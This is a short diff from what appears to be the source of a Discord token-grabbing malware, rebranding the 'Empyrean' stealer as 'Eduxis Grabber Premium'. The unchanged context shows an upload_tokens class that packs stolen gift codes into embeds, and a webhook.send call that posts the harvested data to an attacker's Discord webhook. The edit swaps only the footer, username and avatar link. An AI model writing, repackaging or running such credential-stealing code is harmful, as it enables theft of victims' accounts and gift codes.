@@ -367,6 +367,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="Eduxis Grabber")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Eduxis Grabber Premium", avatar_url="https://cdn.discordapp.com/attachments/1068556762644492348/1069255467957751938/download_1.jpeg")
